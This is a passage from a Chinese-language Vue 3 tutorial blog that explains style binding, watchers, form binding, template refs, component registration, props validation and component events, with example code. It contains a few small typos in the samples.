&#x27;&#x27;]&quot;&gt;Class样式绑定4&lt;/p&gt;</span><br><span class="line">&lt;!-- 数组嵌套对象 --&gt;</span><br><span class="line">&lt;p :class=&quot;[&#123; &#x27;active&#x27;:isActive &#125;, errorClass]&quot;&gt;Class样式绑定5&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            // 改变bool值使类带上对应值</span><br><span class="line">            isActive:true,</span><br><span class="line">            hasError:false,</span><br><span class="line">            classObject:&#123;</span><br><span class="line">            &#x27;active&#x27;:true,</span><br><span class="line">            &#x27;text-danger&#x27;:true</span><br><span class="line">        &#125;,</span><br><span class="line">            arrActive:&quot;active&quot;,</span><br><span class="line">            arrHasError:&quot;text-danger&quot;,</span><br><span class="line">errorClass:&quot;text-danger&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.active&#123; font-size: 30px; &#125;</span><br><span class="line">.text-danger&#123; color: red; &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="12-Style绑定"><a href="#12-Style绑定" class="headerlink" title="12 Style绑定"></a>12 Style绑定</h3><blockquote><p>数据绑定的一个常见需求场景是操纵元素的<code>CSS style</code>列表，因为<code>style</code>是<code>attribute</code>，我们可以和其他<br><code>attribute</code>一样使用<code>v-bind</code>将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue专门为<code>style</code>的<code>v-bind</code>用法提供了特殊的功能增强。除了字符串外，表达式的值也可以是对象或数组。</p><p>一般不使用，因为Style绑定的权重很高，后期想改比较麻烦，要使用推荐使用class绑定。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 记得加单位 --&gt;</span><br><span class="line">&lt;p :style=&quot;&#123;color:activeColor,fontSize:fontSize +&#x27;px&#x27; &#125;&quot;&gt;Style绑定1&lt;/p&gt;</span><br><span class="line">&lt;!-- 绑定类 --&gt;</span><br><span class="line">&lt;p :style=&quot;styleobject&quot; &gt;Style绑定2&lt;/p&gt;</span><br><span class="line">&lt;!-- 绑定数组（一般不用） --&gt;</span><br><span class="line">&lt;p :style=&quot;[styleobject]&quot;&gt;Style绑定3&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">activeColor: &quot;green&quot;,</span><br><span class="line">fontSize: 30,</span><br><span class="line">styleobject: &#123;</span><br><span class="line">color : &quot;red&quot;,</span><br><span class="line">fontsize: &quot;30px&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="13-侦听器"><a href="#13-侦听器" class="headerlink" title="13 侦听器"></a>13 侦听器</h3><blockquote><p>侦听数据的变化，然后执行对应操作。具有响应式的数据可以被侦听，比如<code>&#123;&#123; value &#125;&#125;</code>。</p><p>我们可以使用<code>watch</code>选项在每次响应式属性发生变化时触发一个函数。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;侦听器&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;button @click=&quot;updateHandle&quot;&gt;修改数据&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message: &quot;Hello&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">updateHandle()&#123;</span><br><span class="line">this.message = &quot;World&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">watch:&#123;</span><br><span class="line">// 与属性名相同（参数1是新数据，参数2是老数据）</span><br><span class="line">message(newValue,oldValue)&#123;</span><br><span class="line">console.log(newValue,oldValue);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="14-表单输入绑定"><a href="#14-表单输入绑定" class="headerlink" title="14 表单输入绑定"></a>14 表单输入绑定</h3><blockquote><p>在前端处理表单时，我们常常需要将表单输入框的内容同步给JavaScript 中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦，<code>v-model</code>指令帮我们简化了这一步骤。</p><p><code>v-model</code>也有修饰符</p><ul><li><code>.lazy</code><br>默认情况下，<code>v-model</code>会在每次<code>input</code>事件后更新数据。你可以添加<code>.lazy</code> 修饰符来改为在每次<code>change</code>事件后更新数据。比如输入完成后点击搜索或其他地方才会更改数据。</li><li><code>.number</code>：只接受数字类型。</li><li><code>.trim</code>：输出会去除前后空格。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;表单输入绑定&lt;/h3&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">        &lt;!-- 数据回显 --&gt;</span><br><span class="line">数据：&lt;input type=&quot;text&quot; v-model=&quot;message&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;!-- 懒惰回显--&gt;</span><br><span class="line">        懒惰：&lt;input type=&quot;text&quot; v-model.lazy=&quot;lazy&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; lazy &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;!-- 数字回显 --&gt;</span><br><span class="line">数字：&lt;input type=&quot;text&quot; v-model.number=&quot;number&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; number &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;!-- 去空格回显--&gt;</span><br><span class="line">        左右去空格：&lt;input type=&quot;text&quot; v-model.trim=&quot;trim&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123; trim &#125;&#125;&lt;/p&gt;</span><br><span class="line">        &lt;!-- 勾选修改 --&gt;</span><br><span class="line">        &lt;input type=&quot;checkbox&quot; id=&quot;checkbox&quot; v-model=&quot;checked&quot; /&gt;</span><br><span class="line">        &lt;label for=&quot;checkbox&quot;&gt;&#123;&#123; checked &#125;&#125;&lt;/label&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message: &quot;&quot;,</span><br><span class="line">            lazy: &quot;&quot;,</span><br><span class="line">            number: &quot;&quot;,</span><br><span class="line">            trim: &quot;&quot;,</span><br><span class="line">            checked:false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="15-模板引用"><a href="#15-模板引用" class="headerlink" title="15 模板引用"></a>15 模板引用</h3><blockquote><p>虽然Vue的声明性渲染模型为你抽象了大部分对DOM的直接操作，但在某些情况下，我们仍然需要直接访问底层DOM元素。要实现这一点，我们可以使用特殊的<code>ref attribute</code>。</p><p>挂载结束后引用都会被暴露在<code>this.$refs</code>之上。</p><p>对模板操作：</p><ul><li>内容改变：<code>&#123;&#123; 模板语法 &#125;&#125;</code></li><li>属性改变：<code>v-bind:指令</code>，<code>:指令</code></li><li>事件：<code>v-on:click</code>，<code>@click</code></li><li>DOM：<code>ref=&quot;name&quot;</code>，<code>$refs.ref_name.js_func</code>。如果没有特别的需求，不要操作DOM!</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 绑定ref用于执行JS函数 --&gt;</span><br><span class="line">&lt;div ref=&quot;container&quot; class=&quot;container&quot;&gt;&#123;&#123; content &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;input ref=&quot;username&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">&lt;button @click=&quot;getElementHandle&quot;&gt;获取元素&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">content:&quot;内容&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">getElementHandle()&#123;</span><br><span class="line">// 通过$refs.ref_name.js_func执行原生JS函数</span><br><span class="line">this.$refs.container.innerHTML = &quot;哈哈哈&quot;;</span><br><span class="line">console.log(this.$refs.username.value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="三、-Vue组件"><a href="#三、-Vue组件" class="headerlink" title="三、 Vue组件"></a>三、 Vue组件</h2><h3 id="1-组件基础"><a href="#1-组件基础" class="headerlink" title="1 组件基础"></a>1 组件基础</h3><blockquote><p>组件最大的优势就是可复用性。</p><p>当使用构建步骤时，我们一般会将Vue组件定义在一个单独的<code>.vue</code>文件中，这被叫做单文件组件（简称SFC）</p><p>在components中创建的Vue，通过App.vue进行关联。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 组件书写 --&gt;</span><br><span class="line">&lt;!-- 承载Html标签（必有） --&gt;</span><br><span class="line">&lt;temp1ate&gt;</span><br><span class="line">&lt;div&gt;承载标签&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 承载JS逻辑（可以没有） --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 承载CSS样式（可以没有） --&gt;</span><br><span class="line">&lt;!-- scoped表示样式只作用于当前内部元素，不会影响别的组件 --&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 在App.vue中 --&gt;</span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">    // 第一步:引入组件</span><br><span class="line">    import MyComponent from &quot;./components/MyComponent.vue&quot;</span><br><span class="line">    </span><br><span class="line">    export default &#123;</span><br><span class="line">    // 第二步:注入组件</span><br><span class="line">    components:&#123;</span><br><span class="line">MyComponent</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 第三步:显示组件，两种写法 --&gt;</span><br><span class="line">    &lt;MyComponent/&gt;</span><br><span class="line">&lt;my-component/ &gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="2-简单样式"><a href="#2-简单样式" class="headerlink" title="2 简单样式"></a>2 简单样式</h3><blockquote><p>APP.vue中引入：Header、Main、Aside。</p><p>Main.vue中继续引入：Article。</p><p>Aside.vue中继续引入：Item。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Header.vue--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Header&lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">h3&#123;</span><br><span class="line">width: 100%;</span><br><span class="line">    height: 100px;</span><br><span class="line">    border: 5px solid #999;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 100px;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Article.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Article&lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">h3&#123;</span><br><span class="line">    width: 80%;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 100px;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">    margin-top: 50px;</span><br><span class="line">    background: #999;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Main.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">&lt;h3&gt;Main&lt;/h3&gt;</span><br><span class="line">        &lt;Article/&gt;</span><br><span class="line">        &lt;Article/&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Article from &quot;./Article.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">components: &#123;</span><br><span class="line">Article</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.main&#123;</span><br><span class="line">    float: left;</span><br><span class="line">    width: 70%;</span><br><span class="line">    height: 400px;</span><br><span class="line">    border: 5px solid #999;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Item.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Item&lt;/h3&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">h3&#123;</span><br><span class="line">    width: 80%;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 100px;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">    margin-top: 10px;</span><br><span class="line">    background: #999;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Aside.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;aside&quot;&gt;</span><br><span class="line">&lt;h3&gt;Aside&lt;/h3&gt;</span><br><span class="line">        &lt;Item /&gt;</span><br><span class="line">        &lt;Item /&gt;</span><br><span class="line">        &lt;Item /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Item from &quot;./Item.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">    components: &#123;</span><br><span class="line">        Item</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.aside&#123;</span><br><span class="line">    float: right;</span><br><span class="line">    width: 30%;</span><br><span class="line">    height: 400px;</span><br><span class="line">    border: 5px solid #999;</span><br><span class="line">    box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- App.vue --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">// This starter template is using Vue 3 &lt;script setup&gt; SFCs</span><br><span class="line">// Check out https://v3.vuejs.org/api/sfc-script-setup.html#sfc-script-setup</span><br><span class="line">    // 第一步:引入组件</span><br><span class="line">    import Header from &quot;./components/Header.vue&quot;</span><br><span class="line">import Main from &quot;./components/Main.vue&quot;</span><br><span class="line">import Aside from &quot;./components/Aside.vue&quot;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    // 第二步:注入组件</span><br><span class="line">    components:&#123;</span><br><span class="line">Header,</span><br><span class="line">Main,</span><br><span class="line">Aside</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;Header /&gt;</span><br><span class="line">&lt;Main /&gt;</span><br><span class="line">&lt;Aside /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="3-注册方式"><a href="#3-注册方式" class="headerlink" title="3 注册方式"></a>3 注册方式</h3><blockquote><p>全局注册虽然很方便，但有以下几个问题：</p><ul><li><p>全局注册，但并没有被使用的组件无法在生产打包时被自动移除<code>(也叫&quot;tree-shaking&quot;)</code>。如果你全局注册了一个组件，即使它并没有被实际使用，它仍然会出现在打包后的JS文件中。</p></li><li><p>全局注册在大型项目中使项目的依赖关系变得不那么明确。在父组件中使用子组件时，不太容易定位子组件的实现。和使用过多的全局变量一样，这可能会影响应用长期的可维护性。</p></li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 局部注册，在任意vue中</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Item</span> <span class="keyword">from</span> <span class="string">&quot;./Item.vue&quot;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">components</span>: &#123;</span><br><span class="line">        <span class="title class_">Item</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局注册，在main.js中，注册后再任意组件中都可以用</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Header</span> <span class="keyword">from</span> <span class="string">&quot;./components/Header.vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在创建app后，挂载app前写组件</span></span><br><span class="line">app.<span class="title function_">component</span>(<span class="string">&quot;Header&quot;</span>,<span class="title class_">Header</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>( <span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="4-组件传递数据"><a href="#4-组件传递数据" class="headerlink" title="4 组件传递数据"></a>4 组件传递数据</h3><blockquote><p>组件与组件之间不是完全独立的，而是有交集的，那就是组件与组件之间是可以传递数据的传递数据的解决方案就是<code>props</code>。</p><p>通过<code>props</code>传递数据，不仅可以传递字符串类型的数据，还可以是其他类型，例如：数字、对象、数组等。但实际上任何类型的值都可以作为<code>props</code>的值被传递。</p><p><code>props</code>传递数据，只能从父级传递到子级，不能反其道而行。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Parent&lt;/h3&gt;</span><br><span class="line">&lt;!-- 传递数据 --&gt;</span><br><span class="line">&lt;Child title=&quot;Parent数据&quot; demo=&quot;测试&quot; /&gt;</span><br><span class="line">&lt;!-- 传递动态数据 --&gt;</span><br><span class="line">&lt;Child :msg=&quot;message&quot; :age=&quot;age&quot; /&gt;</span><br><span class="line">&lt;!-- 传递数组数据 --&gt;</span><br><span class="line">&lt;Child :names=&quot;names&quot; /&gt;</span><br><span class="line">&lt;!-- 传递对象数据 --&gt;</span><br><span class="line">&lt;!-- &lt;Child :userInfo=&quot;userInfo&quot; /&gt; --&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message:&quot;Parent dynamic data!&quot;,</span><br><span class="line">age:20,</span><br><span class="line">names:[&quot;yui&quot;,&quot;mio&quot;,&quot;tsumugi&quot;],</span><br><span class="line">userInfo:&#123;</span><br><span class="line">name: &quot;kurumi&quot;,</span><br><span class="line">age: 16</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">components:&#123;</span><br><span class="line">Child</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;!-- 没有的参数默认是传递undefined --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; demo &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; age &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;(item, index) of names&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; userInfo.name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; userInfo.age &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    // 子组件接收数据</span><br><span class="line">    props: [&quot;title&quot;,&quot;demo&quot;,&quot;msg&quot;,&quot;age&quot;,&quot;names&quot;,&quot;userInfo&quot;]</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="5-组件数据验证"><a href="#5-组件数据验证" class="headerlink" title="5 组件数据验证"></a>5 组件数据验证</h3><blockquote><p>添加组件数据验证：</p><ul><li>type：类型验证</li><li>default：默认值</li><li>required：是否必须</li><li>validator：自定义验证函数</li></ul><p>主：<code>prop</code>的数据是只读的，不可修改。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Parent&lt;/h3&gt;</span><br><span class="line">&lt;Child :single=&quot;single&quot; :multiple=&quot;multiple&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">single: 20,</span><br><span class="line">            multiple: &quot;123&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;,</span><br><span class="line">components: &#123;</span><br><span class="line">Child</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; single &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; multiple &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; age &#125;&#125;&lt;/P&gt;</span><br><span class="line">&lt;p v-for=&quot;(item,index) of names&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    props: &#123;</span><br><span class="line">        // 数据验证</span><br><span class="line">        single: &#123;</span><br><span class="line">            // 类型验证，验证不通过爆警告</span><br><span class="line">            type: String,</span><br><span class="line">            // 必须项</span><br><span class="line">            required: true</span><br><span class="line">        &#125;,</span><br><span class="line">        multiple: &#123;</span><br><span class="line">            // 多个类型验证</span><br><span class="line">            type: [Number, Array, Object]</span><br><span class="line">        &#125;,</span><br><span class="line">        age: &#123;</span><br><span class="line">            type: Number,</span><br><span class="line">            // 默认值</span><br><span class="line">            default: 10</span><br><span class="line">        &#125;,</span><br><span class="line">names: &#123;</span><br><span class="line">type: Array,</span><br><span class="line">            // 数字可以字符串可以直接default，但是数组或对象必须用工厂函数返回默认值</span><br><span class="line">default()&#123;</span><br><span class="line">return [&quot;yui&quot;,&quot;mio&quot;,&quot;tsumugi&quot;]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 验证类的同时还验证类中的数据 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    props: &#123;</span><br><span class="line">        value: &#123;</span><br><span class="line">            type: Object,</span><br><span class="line">            required: true,</span><br><span class="line">            validator: (value) =&gt; &#123;</span><br><span class="line">                return typeof value.title === &#x27;string&#x27; &amp;&amp;</span><br><span class="line">                    typeof value.content === &#x27;string&#x27; &amp;&amp;</span><br><span class="line">                    typeof value.src === &#x27;string&#x27; &amp;&amp;</span><br><span class="line">                    typeof value.time === &#x27;number&#x27;;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="6-组件事件"><a href="#6-组件事件" class="headerlink" title="6 组件事件"></a>6 组件事件</h3><blockquote><p>在组件的模板表达式中，可以直接使用<code>$emit</code>方法触发自定义事件。</p><p>触发自定义事件的目的是组件之间传递数据。</p><p>组件之间数据传递：</p><ul><li>父传子：<code>props</code></li><li>子传父：<code>this.$emit</code></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h3&gt;组件事件&lt;/h3&gt;</span><br><span class="line">    &lt;Child @someEvent=&quot;getHandle&quot; /&gt;</span><br><span class="line">&lt;p&gt;父元素：&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &quot;./Child.vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">message: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    components:&#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        getHandle(data)&#123;</span><br><span class="line">this.message = data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;button @click=&quot;clickEventHandle&quot;&gt;传递数据&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">data()&#123;</span><br><span class="line">return&#123;</span><br><span class="line">msg: &quot;Child数据！&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        clickEventHandle()&#123;</span><br><span class="line">            //自定义事件</span><br><span class="line">            this.$emit(&quot;someEvent&quot;,this.msg)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="7-组件侦听"><a href="#7-组件侦听" class="headerlink" title="7 组件侦听"></a>7 组件侦听</h3><blockquote><p>组件配合<code>v-model</code>使用，可以实现一个组件读取数据，另一个组件接收数据。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span 